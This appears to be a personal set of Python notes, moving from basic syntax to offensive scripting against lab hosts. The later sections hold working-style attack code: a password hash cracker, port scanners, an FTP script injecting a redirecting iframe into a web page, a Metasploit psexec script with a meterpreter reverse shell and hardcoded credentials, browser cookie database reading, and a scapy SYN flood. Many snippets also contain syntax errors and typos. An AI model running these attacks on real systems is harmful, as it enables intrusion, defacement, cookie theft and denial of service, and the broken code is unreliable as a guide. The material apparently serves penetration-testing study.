# Python

## Basics

### Strings

> Immutable and can use single, double, or triple quotes

```python
# Creation
print("Hello, world!")
print('Hello, world!')
print("""This string runs
    multiple lines!""")
print("This string is " + "awesome!")  # Concatenation
print('\n')  # Add a new line
print('\t')  # Add a tab
```

```python
my_name = "Erich"
print(my_name[0])  # Print first letter of my_name
sentence = "This is a sentence."
print(sentence[:4])  # Print first 4 letters
print(sentence.split())  # Print out each word/index based on delimter (space)
print(sentence_split = sentence.split()
print(sentence_join = ' '.join(sentence_split))
quote = "He said, 'give me all your money'"  # Using quotes in a string
quote2 = "He said, \"give me all your money\""  # Escaping same quotes
too_much_space = "        hello        "
print(too_much_space.strip())  # Print string removing extra space
print("A" in "Apple")  # Will return True
print("A" in "apple")  # Will return False
letter = "A"
word = "Apple"
print(letter.lower() in word.lower())
movie = "The Hangover"
print(f"My favorite movie is {movie}.")
```

### Math

```python
print(50 + 50)  # Add
print(50 - 50)  # Subtract
print(50 * 50)  # Multiply
print(50 / 6)  # Divide
print(50 // 6)  # Divide, with no remainder
print(50 + 50 - 50 * 50 / 50)  # PEMDAS
print(50 ** 2)  # Exponents
print(50 % 6)  # Modulus (Remainder of 50 divided by 6 i.e. 2)
```

### Variables and Methods

```python
# Creating a variable called quote
quote = "All is fair in love and war."
# Print out the value of the quite variable
print(quote)
print(quote.upper())  # Print value as uppercase using upper() method
print(quote.lower())  # Print value as uppercase using lower() method
print(quote.title())  # Print value as uppercase using title() method
print(len(quote))  # Print the length of the value of quote
# Building upon this
name = "Erich"  # String
age = 33  # Int
gpa = 4.0  # Float
# Use str() method to conver Int to a String
print("My name is " + name + " and I am " + str(age) + " years old.")
```

### Lists

> Mutable and uses square brackets

```python
# Creation
movies = ["When Harry Met Sally", "Than Hangover", "The Perks of Being a Wallflower", "The Exorcist"]
print(len(movies))  # Print the length (item count) of the list
# Indexing and Slicing
print(movies[1])  # Will return "The Hangover"
print(movies[0])  # will return "When Harry Met Sally"
print(movies[1:3])  # Will return "Than Hangover" and "The Perks of Being a Wallflower"
print(movies[1:])  # Get the item in index 1 and the rest of the list
print(movies[:1])  # Get the items before the item in index 1
print(movies[-1])  # Get the last item in the list
# Basic Methods
print(movies.append("Jaws"))  # Append and item to the list
print(movies.pop())  # Removes the last item of the list (-1 by default)
print(movies.pop(0))  # Remove the first (a specified index) item from the list
new_list.reverse()  # Reverse list order
new_list.sort()  # Sort the list
# Nesting Lists
lst_1=[1,2,3]
lst_2=[4,5,6]
lst_3=[7,8,9]
# Make a list of lists to form a matrix
matrix = [lst_1,lst_2,lst_3]
print(matrix)  # Returns [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
print(matrix[0])  # Returns [1, 2, 3]
print(matrix[0][0])  # Returns 1
# List Comprehensions
first_col = [row[0] for row in matrix]
print(first_col)  # Returns [1, 4, 7]
```

### Dictionaries

> Key/Value pairs and use curly braces.

<pre class="language-python"><code class="lang-python"># Creation (Basic)
drinks = {"White Russian": 7, "Old Fashioned": 10, "Lemon Drop": 8}
drinks["White Russian"] = 8  # Update existing key value in drinks
# Get values based on specified key
drinks.get("White Russian")
drinks["White Russian"]
<strong>
</strong><strong># Creation (Advanced)
</strong>employees = {"Finance": ["bob", "Linda", "Tina"], "IT": ["Gene", "Louise", "Teddy"], "HR": ["Jimmy Jr.", "Mort"]}
employees["Legal"] = ["Mr. Frond"]  # Add new key/value pair to employees
employees.update({"Sales": ["Andie", "Ollie"]})  # Add new key/value pairs to employees
# Get values based on specified keys (multiple)
employees['Finance']  # Returns ["bob", "Linda", "Tina"]
employees['Finance'][0]  # Returns "bob"

# Nesting
d = {'key1':{'nestkey':{'subnestkey':'value'}}}
d['key1']['nestkey']['subnestkey']  # Returns 'value'

# Methods
d = {'key1':1,'key2':2,'key3':3}
d.keys()  # Return all keys
d.values()  # Return all values
d.items()  # Return tuples of all items
</code></pre>

### Tuples

> Immutable and uses parentheses. Ex: Grades, Days of the week, etc.

```python
# Creation
grades = ("a", "b", "c", "d", "f")
nums = (1, 2, 3, 4, 5, 6)
mixed = ('word', 137)
# Check length
len(nums)
# Indexing
grades[1] # Will print out "b"
# Slicing
mixed[-1]
# Basic methods
mixed.index('word')  # enter a value and return the index
mixed.count('word')  # count the number of times a value appears
```

### Sets and Booleans

### Boolean Expressions

```python
bool1 = True  # Will equal to True
bool2 = 3*3 == 9  # Will equal to True
bool3 = False  # Will equal to False
bool4 = 3*3 != 9  # Will equal to False
print(bool1,bool2,bool3,bool4)  # True True False False
print(type(bool1))  # <class 'bool'>
```

### Relational and Boolean Operators

```python
greater_than = 7 > 6  # Will be True
less_than 5 < 7  # Will be True
greater_than_equal_to = 7>= 7  # Will be True
less_than_equal_to = 7 <= 7  # Will be True
test_and = (7 > 5) and (5 < 7)  # Will be True
test_and2 = (7 > 5) and (5 > 7)  # Will be False
test_or = (7 > 5) or (5 > 7)  # Will be True
test_not = not True  # Will be True
```

## Statements and Loops

### Conditional Statements

```python
# Example 1
def drink(money):
    if money >= 2:
        return "You can purchase the drink"
    else:
        return "No drink for you!"
print(drink(3))  # Will return first condition
print(drink(1))  # Will return second condition
# Example 2
def alcohol(age, money):
    if (age >= 21 and (money >= 5):
        return "We are getting a drink!"
    elif (age >=21) and (money < 5):
        return "Come back with more money."
    elif (age < 21) and (oney >= 5):
        return "Nice try, kid."
    else:
        return "You are too poor and too young."
print(alcohol(21,5))  # Will return first condition
print(alcohol(21,4))  # Will return second condition
print(alcohol(19,5))  # Will return third condition
print(alcohol(19,4))  # Will return fourth condition
```

### Looping

```python
# For Loops
veggies = ["cucumber", "spinach", "cabbage"]
for v in veggies:
   print(v)
# While Loops
i = 1
while i < 10:
    print(i)
    i += 1
```

## Methods and Functions

### Functions

```python
# Example 1
def who_am_i():
    name = "Erich"
    age = 33
    print("My name is " + name + " and I am " + str(age) + " years old.")
who_am_i()
# Example 2 - Using a parameter
def add_one_hundred(num):
    print(num + 100)
add_one_hundred(22)
# Example 3 - Multiple parameters
def add(x, y):
    print(x + y)
add(7,7)
# Example 4 - Using return
def multiply(x, y):
    return x * y
print(multiple(7,7))
# Example 5
def square_root(x):
    print(x ** .5)
square_root(64)
# Example 6
def new_line():
    print('\n')
new_line()
```

## Object Oriented Programming

## Modules and Packages

### Importing Modules

```python
import sys  # Import module
from datetime import datetime  # Import part of a module
import datetime as dt  # Import module and giving it an alias
print(sys.version)
print(datetime.now())
print(dt.now())
```

## Error and Exception Handling

## Python Decorators

## Python Generators

## Other

### Sockets

```python
# Mini 5 line script using sockets
import socket
HOST = '127.0.0.1'
PORT = 7777
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# Listen on 7777 using netcat
nc -lvnp 7777
# Execute the socket 5 lines script to connect to netcat
```

## Python Scripting

### System Functions

#### Crypt

```python
import crypt
# Use crypt function by passing in a password and a salt
crypt.crypt("secret","MS")
# Will return a hash value
```

```python
# Compare hash value from words in a file to a known hash
import crypt
import sys
passfile=open('dict.txt', 'r')
for word in passfile.readline():
  if (crypt.crypt(word.strip(),"MS")==sys.argv[1]):
    print("password is " + word)
    
# python ./getpass.py <hash value from before>
```

### Networking Functions

#### socket

```python
# Retrieve the banner from a specified IP and Port
import socket
socket.setdefaulttimeout(1)
s=socket.socket()
s.connect_ex(("10.0.2.8",21))
banner=s.recv(1024)
s.close()
print(banner)
```

```python
# Port scanner for a range of ports specifying an IP as the argument
import socket
import sys
try:
  for i in range (1,1024);
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  if s.connect_ex((sys.argv[1],i))=0:
    print(sys.argv[1]+":"+str(i)+ " open"
  s.close()
except Exception, e:
  pass
```

### Working with Websites

#### ftplib

```python
import ftplib
ftp=ftplib.FTP('10.0.2.8')
ftp.login('msfadmin','msfadmin')
ftp.cwd('/var/www/')
ftp.dir()
```

#### urllib

```python
import urllib
f=urllib.urlopen('http://10.0.2.8','index.php')
print(f.read())
```

Using ftplib to execute a webinject

```python
import ftplib
ftp=ftplib.FTP('10.0.2.8')
ftp.login('msfadmin','msfadmin')
ftp.cwd('/var/www/myacc')
f=open('index.tmp'.'w')
ftp.retrlines('RETR myacc.html',f.write)
f.write('<iframe src="http://10.0.2.8/myacc/gotcha"></iframe>')
f.close
f=open('index.tmp','r')
ftp.storlines('STORE myacc.html',f)
f.close()
ftp.close()
print("Accounts page redirected to Gotcha site"
```

### Driving Metasploit through Python

```python
import os
import sys
def shell(metafile):
  metafile.write('use exploit/multi/handler\n')
  metafile.write('set payload windows/meterpreter/reverse_tcp\n')
  metafile.write('set LHOST 10.0.2.11\n')
  metafile.write('set LPORT 3000\n')
  metafile.write('exploit -j z\n')
  metafile.write('setg DisablePayloadHandler 1\n')

def exploit(metafile):
  metafile.write('use exploit/windows/smb/psexec\n')
  metafile.write('set RHOST 10.0.2.6\n')
  metafile.write('set SMBUser IEUser\n')
  metafile.write('set SMBPass Passw0rd!\n')
  metafile.write('set payload windows/meterpreter/reverse_tcp\n')
  metafile.write('set LHOST 10.0.2.11\n')
  metafile.write('set LPORT 3000\n')
  metafile.write('exploit -j z\n')
  
metafile=open('meta.rc','w')
shell(metafile)
exploit(metafile)
metafile.close()
os.system('msfconsole -r meta.rc')
```

### Access SQLite Databases

#### View tables of a database

```python
import sqlite3
cs=sqlite3.connect('Cookies')  # Connect to a database called Cookies
c=cs.cursor()
c.execute('SELECT tbl_name FROM sqlite_master WHERE type==\"table\";')
for row in c:
  print(str(row))
```

#### View column/field names of a database table

```python
import sqlite3
cs=sqlite3.connect('Cookies')
c=cs.execute('SELECT * FROM cookies;')  # Get everything from cookies table of the Cookies DB
for row in c.description:
  print(row[0])
```

#### View table data

```python
import sqlite3
cs=sqlite3.connect('Cookies')
c=cs.cursor()
c.execute('SELECT host_key,name FROM cookies;')  # Get host_key and name field values from the cookies table
for row in c:
  print(row[1].ljust(16)+' '+row[0])
```

### Scapy

Using scapy to create a SYN flood

```python
from scapy.all import *
def flood (src,tgt):
  for port in range(1024,65536):
    send(IP(src=src,dst=tgt)/TCP(sport=port, dport=4444, flags="5"))
source='10.0.2.99"
target="10.0.2.8"
flood(source,target)
```

## Scripts

### Port Scanner

```python
#!/bin/python
import sys
import socket
from datetime import datetime
# Define our target
if len(sys.argv) == 2:
    target = socket.gethostbyname(sys.argv[1])  # Translate hostname to IPv4
else:
    print("Invalid amount of arguments.")
    print("Syntax: python3 scanner.py <ip>"
# Add pretty banner
print("-" * 50)
print("Scanning target " + target)
print("Time started: " + str(datetime.now()))
print("-" * 50)
try:
    for port in range(21,88):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target,port))  # Returns an error indicator
        if result == 0:
            print(f"Port {port} is open.")
        s.close()
except KeyboardInterrupt:
    print("\nExiting program.")
    sys.exit()
except socket.gaierror:
    print("Hostname could not be resolved.")
    sys.exit()
except socket.error:
    print("Could not connect to server.")
    sys.exit()
```
